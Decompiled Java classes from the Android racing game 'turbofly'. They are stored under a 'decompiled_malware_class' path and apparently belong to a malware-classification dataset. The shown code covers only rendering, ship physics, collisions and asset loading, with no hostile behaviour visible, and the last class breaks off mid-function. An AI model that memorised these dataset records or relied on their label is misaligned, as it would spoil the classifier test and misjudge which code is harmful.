"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Sequence.code","public class Sequence {   public static Sequence[] sequences;   public int finRepeat;   public int maxRepeat;   public int minRepeat;   public int size;   public SectionType[] types;   public int debutRepeat=0;   public int minY=-10;   public int maxY=10;   public Vector compatiblesSuites=new Vector();   public Sequence(  int size,  SectionType baseType,  int minRepeat,  int maxRepeat){     this.size=size;     this.minRepeat=minRepeat;     this.maxRepeat=maxRepeat;     this.finRepeat=size;     this.types=new SectionType[size];     for (int i=0; i < size; i++) {       this.types[i]=baseType;     }   }   public void setSpecular(  float[] color){     for (int i=0; i < this.types.length; i++) {       this.types[i].specular=color;     }   }   public void setDiffuse(  float[] color){     for (int i=0; i < this.types.length; i++) {       this.types[i].diffuse=color;     }   }   public void setFog(  float[] color){     for (int i=0; i < this.types.length; i++) {       this.types[i].fogColor=color;     }   }   public void setAmbient(  float[] color){     for (int i=0; i < this.types.length; i++) {       this.types[i].ambient=color;     }   }   public void setTexture(  int texture1){     for (int i=0; i < this.types.length; i++) {       this.types[i].setTexture(texture1);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Truc.code","public class Truc {   public static final int SHAPE_CUBE=2;   public static final int SHAPE_NOTHING=0;   public static final int SHAPE_SPHERE=1;   public Model3D model3d;   public int prevZ;   public float radius;   public Segment segment;   public float sizeX;   public float sizeY;   public float sizeZ;   public int z;   public int shape=0;   public float angle=0.0f;   public Point3 centerR=new Point3(0.0d,0.0d,0.0d);   public Point3 previousR=new Point3(0.0d,0.0d,0.0d);   public Point3 centerA=new Point3(0.0d,0.0d,0.0d);   public float angleY=0.0f;   public float angleX=0.0f;   public boolean decorsOnly=true;   public boolean isStatic=false;   public boolean isTransparent=false;   public boolean isPlayer=false;   public float vxb=0.0f;   public float vyb=0.0f;   public float vzb=0.0f;   public void majRelXYZ(  double x,  double y,  double z){     this.centerR.set(x,y,z);   }   public void majPreviousRelXYZ(  double x,  double y,  double z,  int iz){     this.previousR.set(x,y,z);     this.prevZ=iz;   }   public void calcAbsXYZ(){     if (this.segment != null) {       this.centerA.set(this.segment.getXPos(this.centerR.x,this.centerR.y,this.centerR.z),this.segment.getYPos(this.centerR.x,this.centerR.y,this.centerR.z),this.segment.getZPos(this.centerR.x,this.centerR.y,this.centerR.z));       if (this.isStatic) {         this.angleY=this.segment.getAngleY(1.0f);       }  else       if (this.isPlayer) {         this.angleY=(float)((InGame.angleY * 0.7d) + (this.segment.getAngleY((float)this.centerR.z) * 0.3d));       }  else {         this.angleY=this.segment.getAngleY((float)this.centerR.z);       }       this.angleX=this.segment.getAngle((float)this.centerR.z);       return;     }     this.centerA.set((int)(this.centerR.x * 122880.0d),(int)(this.centerR.y * 122880.0d),(int)(this.centerR.z * 122880.0d));   }   public void draw(){     calcAbsXYZ();     GLES10.glTranslatex((int)this.centerA.x,(int)this.centerA.y,(int)this.centerA.z);     GLES10.glRotatef(-this.angleX,0.0f,1.0f,0.0f);     GLES10.glRotatef(-this.angleY,1.0f,0.0f,0.0f);     this.model3d.draw();     GLES10.glRotatef(this.angleY,1.0f,0.0f,0.0f);     GLES10.glRotatef(this.angleX,0.0f,1.0f,0.0f);     GLES10.glTranslatex((int)(-this.centerA.x),(int)(-this.centerA.y),(int)(-this.centerA.z));   }   public void setZ(  int i){     this.z=i;     this.segment=Piste.getSegments(this.z);     this.segment.trucsDessus.add(this);   }   public void nowOnZ(  int i){     if (this.segment != null && this.segment.trucsDessus != null) {       this.segment.trucsDessus.remove(this);     }     this.z=i;     this.segment=Piste.getSegments(this.z);     this.segment.trucsDessus.add(this);   }   public boolean collide(  Truc other){     this.centerA.distance(other.centerA);     return false;   }   public void avanceX(  double avance){   }   public void avanceY(  double avance){   }   public void avanceZ(  double avance){   }   public void drawTransparentPart(){   }   private double calcDifZ(  Point3 p1,  int z1,  Point3 p2,  int z2){     if (z1 == z2) {       return (p1.z - p2.z) * Piste.getSegments(z1).relativeTailleZ(((float)(p1.x + p2.x)) * 0.5f);     }     if (z1 > z2) {       return (p1.z * Piste.getSegments(z1).relativeTailleZ((float)p1.x)) + ((1.0d - p2.z) * Piste.getSegments(z2).relativeTailleZ((float)p2.x));     }     return ((1.0d - p1.z) * Piste.getSegments(z1).relativeTailleZ((float)p1.x)) + (p2.z * Piste.getSegments(z2).relativeTailleZ((float)p2.x));   }   public boolean isOn(  Truc other){     if (Math.abs(this.z - other.z) > 1 || this.z == 0) {       return false;     }     double difX=this.centerR.x - other.centerR.x;     double difZ=calcDifZ(this.centerR,this.z,other.centerR,other.z);     double inX=-((Math.abs(difX) - this.sizeX) - other.sizeX);     double inZ=-((Math.abs(difZ) - this.sizeZ) - other.sizeZ);     if (inX > 0.0d && inZ > 0.0d) {       return true;     }     return false;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Vaisseau.code","public class Vaisseau extends Truc {   public static final int ACCELERATION=4;   public static final int MANIABILITE_RETOUR_ANGLE=1;   public static final int MANIABILITE_RETOUR_POS=2;   public static final int SENSIBILITE_TOURNE=0;   public static final int VMAX=3;   public static Rect3D explosion1=null;   public static Rect3D explosion2=null;   public static Rect3D leftParticules=null;   public static final int nbParams=5;   public static Rect3D rightParticules;   public float angleARetourner;   public float angleZ;   public boolean drawExplosion1;   public boolean drawExplosion2;   public boolean drawLeftParticules;   public boolean drawRightParticules;   public Flash flash;   float gravitation;   public int hasWeapon;   public boolean isShip;   int lastZDie;   public float mTz;   public MultiplayerMessage message;   public int mid;   public Vaisseau mine;   public Vaisseau missile;   public boolean missileLaunched;   public Vaisseau missileobj;   private Ombre ombre;   private boolean onPiste;   public float[] params;   private float penche;   int texOmbre;   public int type;   public float vieRestante;   public float x;   public float yb;   public static int SHIP=1;   public static int MISSILE1=2;   public static int MISSILE2=3;   public static int MINES=4;   public static int BOOST=5;   public static int NONE=0;   public Vaisseau(){     this.message=new MultiplayerMessage();     this.type=SHIP;     this.missileLaunched=false;     this.hasWeapon=NONE;     this.isShip=true;     this.drawLeftParticules=false;     this.drawRightParticules=false;     this.drawExplosion1=false;     this.drawExplosion2=false;   }   public Vaisseau(  String texturess,  float _penche){     this.message=new MultiplayerMessage();     this.type=SHIP;     this.missileLaunched=false;     this.hasWeapon=NONE;     this.isShip=true;     this.drawLeftParticules=false;     this.drawRightParticules=false;     this.drawExplosion1=false;     this.drawExplosion2=false;     this.x=0.0f;     this.yb=0.0f;     this.angle=0.0f;     this.angleZ=0.0f;     this.penche=0.0f;     this.mTz=0.0f;     this.gravitation=20.0f;     this.lastZDie=0;     this.vieRestante=10.0f;     this.angleARetourner=0.0f;     this.params=new float[5];     this.onPiste=true;     this.texOmbre=TextureUtil.loadTexture(texturess);     majRelXYZ(this.x,(-0.5d) - this.yb,this.mTz);     this.z=1;     this.penche=_penche;   }   @Override public void draw(){     long mm=System.currentTimeMillis();     float decAngleX=(float)(Math.cos(this.model3d.texture + (mm / 2000.0d)) * 2.0d);     float decAngleY=(float)(Math.cos(this.model3d.texture + (mm / 1500.0d)) * 2.0d);     float decAngleZ=(float)(Math.cos(this.model3d.texture + (mm / 1500.0d)) * 5.0d);     float decAy=(int)(Math.cos(this.model3d.texture + (mm / 600.0d)) * 3000.0d);     GLES10.glBlendFunc(1,771);     if (this.isPlayer && !Osaris2D3D.LOW_END_DEVICE) {       GLES10.glEnable(2896);       GLES10.glEnable(16384);       GLES10.glLightfv(16384,4609,this.segment.type.diffuse,0);       GLES10.glLightfv(16384,4610,this.segment.type.specular,0);       GLES10.glLightfv(16384,4608,this.segment.type.ambient,0);       GLES10.glMaterialfv(1028,4608,this.segment.type.ambient,0);       GLES10.glLightModelfv(2899,this.segment.type.ambient,0);       GLES10.glMaterialf(1032,5633,1.0f);       GLES10.glMaterialfv(1032,4610,this.segment.type.specular,0);       GLES10.glMaterialfv(1032,4609,this.segment.type.diffuse,0);       GLES10.glLightModelx(2898,1);     }     calcAbsXYZ();     GLES10.glTranslatex((int)this.centerA.x,(int)(this.centerA.y + decAy),(int)this.centerA.z);     GLES10.glRotatef((-this.angleX) - decAngleX,0.0f,1.0f,0.0f);     GLES10.glRotatef((-this.angleY) - decAngleY,1.0f,0.0f,0.0f);     if (this.isPlayer) {       GLES10.glRotatef((-this.angle) + InGame.help,0.0f,1.0f,0.0f);     }  else {       GLES10.glRotatef(-this.angle,0.0f,1.0f,0.0f);     }     GLES10.glRotatef((((InGame.iSortaWannaTakScreenzWHenWelYaKnowYaIsSortaTuchinOnDaScreen ? 1.5f : 1.0f) * this.angleZ) - this.angleARetourner) + decAngleZ,0.0f,0.0f,1.0f);     GLES10.glRotatef(this.penche,1.0f,0.0f,0.0f);     if (this.type == MINES) {       this.model3d.draw();       if (System.currentTimeMillis() % 250 < 100) {         this.flash.draw();       }     }  else     if (this.type == MISSILE1) {       this.model3d.draw();       this.flash.draw();     }  else     if (this.type == MISSILE2) {       GLES10.glTranslatex(0,25000,0);       this.model3d.draw();       this.flash.draw();       GLES10.glTranslatex(0,-50000,0);       this.model3d.draw();       this.flash.draw();       GLES10.glTranslatex(0,25000,0);     }  else {       if (!InGame.flashPC && (!this.isPlayer || !InGame.cockpitView)) {         this.model3d.draw();       }       if (this.isPlayer && !Osaris2D3D.LOW_END_DEVICE) {         GLES10.glDisable(2929);         GLES10.glDisable(2896);       }       if ((!this.isPlayer || !InGame.cockpitView) && (((!this.drawExplosion2 && !this.drawExplosion1) || this.isPlayer) && this.flash != null)) {         this.flash.draw();         if (this.isPlayer && InGame.effacc > 0.1d) {           this.flash.draw();         }       }       if (this.drawLeftParticules) {         leftParticules.draw();       }       if (this.drawRightParticules) {         rightParticules.draw();       }       if (this.drawExplosion1) {         GLES10.glDisable(2929);         explosion1.draw();       }       if (this.drawExplosion2) {         GLES10.glDisable(2929);         explosion2.draw();         this.vzb=0.0f;       }       this.drawLeftParticules=false;       this.drawRightParticules=false;       GLES10.glEnable(2929);       if (InGame.flashPC && (!this.isPlayer || !InGame.cockpitView)) {         this.model3d.draw();       }     }     GLES10.glRotatef(-this.penche,1.0f,0.0f,0.0f);     GLES10.glRotatef((((InGame.iSortaWannaTakScreenzWHenWelYaKnowYaIsSortaTuchinOnDaScreen ? 1.5f : 1.0f) * (-this.angleZ)) + this.angleARetourner) - decAngleZ,0.0f,0.0f,1.0f);     if (this.isPlayer) {       GLES10.glRotatef(this.angle - InGame.help,0.0f,1.0f,0.0f);     }  else {       GLES10.glRotatef(this.angle,0.0f,1.0f,0.0f);     }     GLES10.glRotatef(this.angleY + decAngleY,1.0f,0.0f,0.0f);     GLES10.glRotatef(this.angleX + decAngleX,0.0f,1.0f,0.0f);     GLES10.glTranslatex((int)(-this.centerA.x),(int)((-this.centerA.y) - decAy),(int)(-this.centerA.z));     GLES10.glBlendFunc(770,771);   }   public void setOmbre(  Ombre om){     this.ombre=om;   }   public void setFlash(  Flash f){     this.flash=f;   }   public void doPhysics(  float lastX,  float lastY,  float lastZ,  float delta){     if (InGame.multi && !this.isPlayer) {       lastZ=this.message.lastZ;     }     majPrevRelXYZ();     this.segment=Piste.getSegments(this.z);     if (this.type == MINES) {       majRelXYZ();       return;     }     if (lastZ > 0.0f) {       if (this.vxb < 0.0f) {         this.vxb=Math.max(Math.min((this.vxb + (0.075f * delta)) - ((this.vxb * 1.0f) * delta),0.0f),-4.0f);       }       this.vxb=(float)(this.vxb + (Math.abs(Math.sin(Math.toRadians(lastZ))) * 1.2000000476837158d * (1.0f + (Math.abs(this.vzb) * 1.0f))* delta));     }  else     if (lastZ < -0.0f) {       if (this.vxb > 0.0f) {         this.vxb=Math.min(Math.max((this.vxb - (0.075f * delta)) - ((this.vxb * 1.0f) * delta),0.0f),4.0f);       }       this.vxb=(float)(this.vxb - (((Math.abs(Math.sin(Math.toRadians(lastZ))) * 1.2000000476837158d) * (1.0f + (Math.abs(this.vzb) * 1.0f))) * delta));     }     if (this.vxb > 0.0f) {       this.vxb=Math.min(Math.max((this.vxb - (0.075f * delta)) - ((this.vxb * 0.45f) * delta),0.0f),4.0f);     }  else {       this.vxb=Math.max(Math.min((this.vxb + (0.075f * delta)) - ((this.vxb * 0.45f) * delta),0.0f),-4.0f);     }     float vLateral=this.vxb;     double fz=Math.sin(Math.toRadians(lastY));     float vmaxennemi=this.params[3] + ((this.isPlayer || this.z >= InGame.player.z + 10 || InGame.lapsDone >= InGame.nbLaps + (-1)) ? 0.0f : 0.04f);     if (fz > 0.0d) {       this.vzb=(float)(this.vzb + Math.min(Math.max(vmaxennemi - this.vzb,0.0f),Math.abs(this.params[4] * fz) * delta));     }  else     if (fz < -0.0d) {       this.vzb=(float)(this.vzb - (Math.abs(0.8999999761581421d * fz) * delta));     }     if (this.vzb <= 0.0f) {       this.vzb=0.0f;     }  else     if (this.vzb > vmaxennemi) {       this.vzb=Math.max((this.vzb - (0.02f * delta)) - ((Math.abs((this.vxb * 0.2f) * (3.0f + (5.0f * this.vzb))) * delta) * 0.02f),0.0f);     }  else {       this.vzb=Math.max((this.vzb - (0.05f * delta)) - ((Math.abs((this.vxb * 0.2f) * (3.0f + (5.0f * this.vzb))) * delta) * 0.02f),0.0f);     }     this.angle-=((this.params[0] * vLateral) * delta) * 0.75f;     while (this.angle > 180.0f) {       this.angle-=360.0f;     }     while (this.angle <= -180.0f) {       this.angle+=360.0f;     }     float help=this.angle * delta * this.params[1]* (this.vzb + (Math.abs(this.x) * this.params[2]));     if (this.angle > 0.0f && this.onPiste) {       if (this.isPlayer) {         InGame.help-=Math.min(this.angle,help);       }       this.angle=Math.max(this.angle - help,0.0f);     }  else     if (this.angle < 0.0f && this.onPiste) {       if (this.isPlayer) {         InGame.help-=Math.max(this.angle,help);       }       this.angle=Math.min(this.angle - help,0.0f);     }     if ((Piste.level != 2 && Piste.level != 5) || (!this.isPlayer && !InGame.multi)) {       if (this.x >= this.segment.getSizeP(this.mTz) - 0.4d) {         this.x=(float)(this.segment.getSizeP(this.mTz) - 0.4d);         if (Piste.level != 2 && Piste.level != 5) {           this.drawRightParticules=true;         }         this.vzb=(float)(this.vzb - ((this.vzb * delta) * Math.sin(Math.toRadians(Math.abs(this.angle)))));         if (this.lastZDie != this.z) {           this.vieRestante-=1.0f;         }         this.lastZDie=this.z;         if (this.isPlayer) {           OsarisTools.vibrate();         }       }       if (this.x <= this.segment.getSizeN(this.mTz) + 0.4d) {         this.x=(float)(this.segment.getSizeN(this.mTz) + 0.4d);         if (Piste.level != 2 && Piste.level != 5) {           this.drawLeftParticules=true;         }         this.vzb=(float)(this.vzb - ((this.vzb * delta) * Math.sin(Math.toRadians(Math.abs(this.angle)))));         if (this.lastZDie != this.z) {           this.vieRestante-=1.0f;         }         this.lastZDie=this.z;         if (this.isPlayer) {           OsarisTools.vibrate();         }       }     }     if (this.drawExplosion1 && Osaris2D3D.mustDo(11,50L)) {       this.drawExplosion1=VaisseauFactory.changeExplosion1();     }     if (this.drawExplosion2 && Osaris2D3D.mustDo(12,50L)) {       this.drawExplosion2=VaisseauFactory.changeExplosion2();     }     avanceX(this.vzb * delta * 1.5f* Math.sin(Math.toRadians(-this.angle)));     avanceZ(this.vzb * delta * 1.5f* Math.cos(Math.toRadians(-this.angle)));     if (this.isShip) {       if (this.angleARetourner != 0.0f) {         if (this.angleARetourner > 0.0f) {           this.angleARetourner=Math.max(0.0f,this.angleARetourner - (((550.0f - this.angleARetourner) * 0.2f) * delta));         }  else {           this.angleARetourner=Math.min(0.0f,this.angleARetourner + ((550.0f + this.angleARetourner) * 0.2f * delta));         }         if (this.angleARetourner == 0.0f) {           this.angleZ=0.0f;         }       }     }  else     if (this.type == MISSILE2) {       this.angleARetourner+=100.5f * delta;       if (this.angleARetourner > 360.0f) {         this.angleARetourner-=360.0f;       }     }     this.angleZ=(float)(this.angleZ + (((1.5f * lastZ) - this.angleZ) * 0.5d * delta));     float baseY=this.segment.getYBase(this.x,this.mTz) + 0.1f;     if (this.onPiste) {       this.vyb-=(this.vyb * delta) * 0.05f;       this.vyb-=(0.05f * delta) * (this.yb - baseY);       this.yb+=this.vyb * delta;       if (this.yb < (-0.22f) + baseY && this.yb > (-1.5f) + baseY) {         if (this.isPlayer && this.vyb <= -0.2f && Osaris2D3D.mustDo(6,1000L)) {           InGame.blam.play(-this.vyb);         }         this.vyb=(-this.vyb) / 2.0f;         this.yb=(-0.22f) + baseY;       }     }  else {       this.vyb-=0.1f * delta;       this.yb+=this.vyb * delta;     }     this.vyb=Math.min(this.vyb,0.14f);     if (this.onPiste) {       this.vyb=Math.max(this.vyb,-1.0f);     }     if (this.yb < (-15.0f) + baseY || (Piste.level == 5 && this.yb < (-1.5f) + baseY)) {       this.vyb=0.0f;       this.yb=2.0f + baseY;       this.vxb=0.0f;       this.vzb=0.0f;       if (this.isPlayer && InGame.mode == 2) {         this.vieRestante=-1.0f;         this.yb=(-16.0f) + baseY;       }  else {         this.x=0.0f;         this.angle=0.0f;       }     }     if (this.isPlayer && InGame.gameOver && this.yb > (-10.0f) + baseY) {       this.yb=(-0.22f) + baseY;     }     if ((Piste.level == 2 || Piste.level == 5) && (this.x > this.segment.getSizeP(this.mTz) + 0.4d || this.x < this.segment.getSizeN(this.mTz) - 0.4d || this.yb < (-1.5f) + baseY)) {       this.onPiste=false;     }  else {       this.onPiste=true;     }     majRelXYZ();     if (this.missileLaunched || (InGame.multi && this.message.ennemiHitId != 65535)) {       if (this.missile.z > this.z + 50) {         this.missile.nowOnZ(-1);         this.missileLaunched=false;       }  else {         this.missile.doPhysics(0.0f,lastY,0.0f,delta);         for (int i=0; i < InGame.nbConcurrents; i++) {           if (InGame.concurrents[i] != this && (InGame.concurrents[i].collide(this.missile) || (!this.isPlayer && InGame.multi && this.message.ennemiHitId == i))) {             if (InGame.multi && this.message.ennemiHitId == i) {               this.message.ennemiHitId=(char)65535;             }  else             if (InGame.multi && this.isPlayer) {               InGame.player.message.ennemiHitId=(char)i;             }             this.missile.nowOnZ(-1);             this.missileLaunched=false;             if (InGame.concurrents[i].z > InGame.player.z - 5 && InGame.concurrents[i].z < InGame.player.z + 50) {               InGame.expl.play(0.8f);             }             InGame.concurrents[i].vzb=0.0f;             if (InGame.concurrents[i].isPlayer) {               OsarisTools.vibrate();             }             if (this.missile.type == MISSILE1 || this.missile.type == MINES) {               InGame.concurrents[i].drawExplosion1=true;               VaisseauFactory.explosion1Part=0;             }             if (this.missile.type == MISSILE2) {               InGame.concurrents[i].drawExplosion2=true;               VaisseauFactory.explosion2Part=0;             }           }         }       }     }     if (InGame.multi || !this.isShip || this.isPlayer|| this.hasWeapon == NONE) {       return;     }     if (InGame.player.z > this.z - 10 || (this.hasWeapon == MINES && InGame.player.z > this.z - 50)) {       if ((InGame.mode != 1 || InGame.player.z > this.z) && InGame.player.z < this.z + 40 && !this.missileLaunched && Math.random() < 0.005d) {         launchWeapon();       }     }   }   @Override public void avanceZ(  double avance){     boolean hasMore=false;     if (avance != 0.0d) {       float relAvZ=(float)(avance / this.segment.relativeTailleZ(this.x));       double restant=0.0d;       if (this.mTz + relAvZ > 1.0f) {         restant=(((this.mTz + relAvZ) - 1.0f) * avance) / relAvZ;         relAvZ=1.0f - this.mTz;         hasMore=true;       }       this.mTz+=relAvZ;       this.angle+=this.segment.angleDiffRelatif * relAvZ;       this.yb=(float)(this.yb + (Math.sin(Math.toRadians(this.segment.diffAngleY)) * relAvZ * 0.699999988079071d));       if (hasMore && restant > 0.0d) {         this.mTz=0.0f;         this.segment.trucsDessus.remove(this);         this.z++;         if (this.isPlayer && this.z > 1 && !InGame.gameOver) {           InGame.scoreInfini+=7;           Piste.playerIsThereNow(this.z);         }         setZ(this.z);         this.yb=(float)(this.yb + this.segment.decY);         if (this.isShip && this.segment.decY > 4.0d && this.angleARetourner == 0.0f && this.onPiste && ((!this.isPlayer && Math.random() > 0.8d) || (Math.random() > 0.5d && Osaris2D3D.mustDo(7,5000L)))) {           if (this.angleZ > 0.0f) {             this.angleARetourner=360.0f;           }  else {             this.angleARetourner=-360.0f;           }           if (this.isPlayer && Osaris2D3D.mustDo(4,500L)) {             InGame.acc.play(1.0f);           }         }         avanceZ(restant);       }  else {         if (this.mTz < 0.0f) {           this.mTz=0.0f;         }         while (this.angle > 180.0f) {           this.angle-=360.0f;         }         while (this.angle <= -180.0f) {           this.angle+=360.0f;         }         this.angle=Math.min(this.angle,60.0f);         this.angle=Math.max(this.angle,-60.0f);       }       majRelXYZ();       if ((!InGame.multi || this.isPlayer) && this.isShip && this.hasWeapon == NONE) {         if (isOn(Piste.miss) || (!this.isPlayer && this.segment.trucsDessus.contains(Piste.miss) && Math.random() < 0.15d)) {           if (Math.random() > 0.75d) {             this.hasWeapon=MISSILE1;             return;           }           if (Math.random() > 0.66d) {             this.hasWeapon=BOOST;             return;           }           if (Math.random() > 0.5d) {             if (!this.isPlayer) {               this.hasWeapon=MISSILE1;               return;             }  else {               this.hasWeapon=MISSILE2;               return;             }           }           this.hasWeapon=MINES;         }       }     }   }   @Override public void avanceX(  double avance){     this.x=(float)(this.x + avance);     this.angle=this.angle;     majRelXYZ();   }   public void majRelXYZ(){     if (this.isPlayer || this.z + this.mTz > InGame.player.z + InGame.player.mTz) {       majRelXYZ(this.x,(-0.5d) - this.yb,this.mTz);     }  else {       majRelXYZ(this.x,(-0.4d) - this.yb,this.mTz);     }   }   public void majPrevRelXYZ(){     if (this.isPlayer || this.z + this.mTz > InGame.player.z + InGame.player.mTz) {       majPreviousRelXYZ(this.x,(-0.5d) - this.yb,this.mTz,this.z);     }  else {       majPreviousRelXYZ(this.x,(-0.4d) - this.yb,this.mTz,this.z);     }   }   private double calcDifZ(  Point3 p1,  int z1,  Point3 p2,  int z2){     if (z1 == z2) {       return (p1.z - p2.z) * Piste.getSegments(z1).relativeTailleZ(((float)(p1.x + p2.x)) * 0.5f);     }     if (z1 > z2) {       return (p1.z * Piste.getSegments(z1).relativeTailleZ((float)p1.x)) + ((1.0d - p2.z) * Piste.getSegments(z2).relativeTailleZ((float)p2.x));     }     return ((1.0d - p1.z) * Piste.getSegments(z1).relativeTailleZ((float)p1.x)) + (p2.z * Piste.getSegments(z2).relativeTailleZ((float)p2.x));   }   @Override public boolean collide(  Truc other){     if (Math.abs(this.z - other.z) > 1 || this.z == 0) {       return false;     }     double difX=this.centerR.x - other.centerR.x;     double difY=this.centerR.y - other.centerR.y;     double difZ=calcDifZ(this.centerR,this.z,other.centerR,other.z);     double difoX=this.previousR.x - other.previousR.x;     double difoY=this.previousR.y - other.previousR.y;     double difoZ=calcDifZ(this.previousR,this.prevZ,other.previousR,other.prevZ);     double inX=-((Math.abs(difX) - this.sizeX) - other.sizeX);     double inY=-((Math.abs(difY) - this.sizeY) - other.sizeY);     double inZ=-((Math.abs(difZ) - this.sizeZ) - other.sizeZ);     double inoX=-((Math.abs(difoX) - this.sizeX) - other.sizeX);     double inoY=-((Math.abs(difoY) - this.sizeY) - other.sizeY);     double inoZ=-((Math.abs(difoZ) - this.sizeZ) - other.sizeZ);     if (inX > 0.0d && inY > 0.0d && inZ > 0.0d) {       double inX2=Math.max(inX - Math.max(inoX,0.0d),0.0d);       double inY2=Math.max(inY - Math.max(inoY,0.0d),0.0d);       double inZ2=Math.max(inZ - Math.max(inoZ,0.0d),0.0d);       double total=inX2 + inY2 + inZ2;       if (this.centerR.x < other.centerR.x) {         avanceX((-inX2) * 0.6d);         other.avanceX(0.6d * inX2);       }  else {         avanceX(0.6d * inX2);         other.avanceX((-inX2) * 0.6d);       }       if (this.centerR.z + this.z < other.centerR.z + other.z) {         other.avanceZ(1.3d * inZ2);       }  else {         avanceZ(1.3d * inZ2);       }       if (total <= 0.01d) {         return true;       }       float tmp=this.vzb;       float otmp=other.vzb;       this.vzb=(float)((otmp * (inZ2 / total)) + (tmp * (1.0d - (inZ2 / total))));       other.vzb=(float)((otmp * (1.0d - (inZ2 / total))) + (tmp * (inZ2 / total)));       float tmp2=this.vxb;       float otmp2=other.vxb;       this.vxb=(float)((otmp2 * (inZ2 / total)) + (tmp2 * (1.0d - (inZ2 / total))));       other.vxb=(float)((otmp2 * (1.0d - (inZ2 / total))) + (tmp2 * (inZ2 / total)));       return true;     }     return false;   }   @Override public void drawTransparentPart(){     GLES10.glDisable(2929);     calcAbsXYZ();     GLES10.glBindTexture(3553,this.texOmbre);     if (this.segment != null) {       int ombreY=this.segment.getYPos(this.x,-0.1d,this.mTz);       GLES10.glTranslatex((int)this.centerA.x,ombreY,(int)this.centerA.z);       GLES10.glRotatef(-this.angleX,0.0f,1.0f,0.0f);       GLES10.glRotatef(-this.segment.getAngleY(this.mTz),1.0f,0.0f,0.0f);       GLES10.glRotatef(-this.angle,0.0f,1.0f,0.0f);       if (this.onPiste && (!this.isPlayer || !InGame.cockpitView)) {         this.ombre.draw();       }       GLES10.glRotatef(this.angle,0.0f,1.0f,0.0f);       GLES10.glRotatef(this.segment.getAngleY(this.mTz),1.0f,0.0f,0.0f);       GLES10.glRotatef(this.angleX,0.0f,1.0f,0.0f);       GLES10.glTranslatex(-((int)this.centerA.x),-ombreY,-((int)this.centerA.z));     }     GLES10.glEnable(2929);   }   public void launchWeapon(){     if (this.hasWeapon == MINES) {       if (this.isPlayer) {         InGame.minesnd.play(1.0f);       }       this.missile.nowOnZ(-1);       this.missile=this.mine;       this.mine.nowOnZ(this.z);       this.mine.vzb=this.vzb;       this.mine.x=this.x;       this.mine.mTz=this.mTz;       this.mine.yb=-0.4f;       this.mine.type=this.hasWeapon;       this.missileLaunched=true;     }  else     if (this.hasWeapon == BOOST) {       if (this.isPlayer) {         this.vzb=this.params[3] + 0.9f;         InGame.acc.play(1.0f);       }     }  else     if (this.hasWeapon != NONE) {       if (this.isPlayer || InGame.player.z < this.z + 10) {         InGame.missw.play(0.7f - ((InGame.player.z - this.z) * 0.05f));       }       this.missile.nowOnZ(-1);       this.missile=this.missileobj;       this.missile.nowOnZ(this.z);       this.missile.vzb=this.vzb;       this.missile.x=this.x;       this.missile.mTz=this.mTz;       this.missile.yb=this.yb;       this.missile.type=this.hasWeapon;       this.missileLaunched=true;       if (this.isPlayer || this.z < InGame.player.z || InGame.multi) {         this.yb+=0.5f;         this.vyb=0.7f;       }     }     this.hasWeapon=NONE;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\VaisseauFactory.code","public class VaisseauFactory {   public static final int NB_VAISSEAUX=5;   private static Flash[] flashs;   private static Ombre[] ombres;   public static int texFlash;   public static int texFlashRed;   public static Model3D[] vaisseaux;   private static String[][] texturess=Tableaux.texturess;   private static float[] baseYAngle=Tableaux.baseYAngle;   public static float[][] defaultParams=Tableaux.defaultParams;   public static int textParts1=0;   public static int textParts2=0;   public static int textParts3=0;   public static int[] textExplosion=new int[10];   public static boolean heyItsOkayImAlreadyInitializedYeahYeahJustDoNothingItWillBeOkay=false;   public static boolean doneOnce=false;   private static int parts=0;   public static int explosion1Part=0;   public static int explosion2Part=0;   public static int missilePart=0;   public static void loadShips(){     if (!heyItsOkayImAlreadyInitializedYeahYeahJustDoNothingItWillBeOkay) {       texFlash=TextureUtil.loadTexture(""eau2.png"");       texFlashRed=TextureUtil.loadTexture(""red.png"");       if (!doneOnce) {         vaisseaux=new Model3D[7];       }       flashs=new Flash[7];       ombres=new Ombre[7];       if (!doneOnce) {         vaisseaux[0]=new Model3D(""fighter1_1.obj"",3200,-2800,3500,TextureUtil.loadTexture(texturess[0][1]));       }  else {         vaisseaux[0].recreate(TextureUtil.loadTexture(texturess[0][1]));       }       ombres[0]=new Ombre(153600,98304);       flashs[0]=new Flash(0,-2,-1,texFlash);       vaisseaux[0].clockWise();       int v=0 + 1;       if (doneOnce) {         vaisseaux[v].recreate(TextureUtil.loadTexture(texturess[v][1]));       }  else {         vaisseaux[v]=new Model3D(""space_frigate_5.obj"",2500,-2500,-2800,TextureUtil.loadTexture(texturess[v][1]));       }       ombres[v]=new Ombre(140434,107520);       flashs[v]=new Flash(0,-2,-3,texFlash);       int v2=v + 1;       if (doneOnce) {         vaisseaux[v2].recreate(TextureUtil.loadTexture(texturess[v2][1]));       }  else {         vaisseaux[v2]=new Model3D(""fighter_2.obj"",1550,-1500,1800,TextureUtil.loadTexture(texturess[v2][1]));       }       ombres[v2]=new Ombre(134050,98304);       flashs[v2]=new Flash(0,-2,-1,texFlash);       if (!doneOnce) {         vaisseaux[v2].clockWise();       }       int v3=v2 + 1;       if (doneOnce) {         vaisseaux[v3].recreate(TextureUtil.loadTexture(texturess[v3][1]));       }  else {         vaisseaux[v3]=new Model3D(""orange.obj"",7750,-12000,-16384,TextureUtil.loadTexture(texturess[v3][1]));       }       ombres[v3]=new Ombre(105325,122880);       flashs[v3]=new Flash(0,-2,-3,texFlash);       int v4=v3 + 1;       if (doneOnce) {         vaisseaux[v4].recreate(TextureUtil.loadTexture(texturess[v4][1]));       }  else {         vaisseaux[v4]=new Model3D(""spaceship_fighter_2.obj"",950,-1200,-1200,TextureUtil.loadTexture(texturess[v4][1]));       }       ombres[v4]=new Ombre(153600,122880);       flashs[v4]=new Flash(0,-3,-2,texFlash);       if (doneOnce) {         vaisseaux[5].recreate(TextureUtil.loadTexture(""acc1.bmp""));       }  else {         vaisseaux[5]=new Model3D(""miss200.obj"",218,-218,218,TextureUtil.loadTexture(""acc1.bmp""));       }       ombres[5]=new Ombre(34406,81920);       flashs[5]=new Flash(0,-3,-8,TextureUtil.loadTexture(""flash4.png""),true);       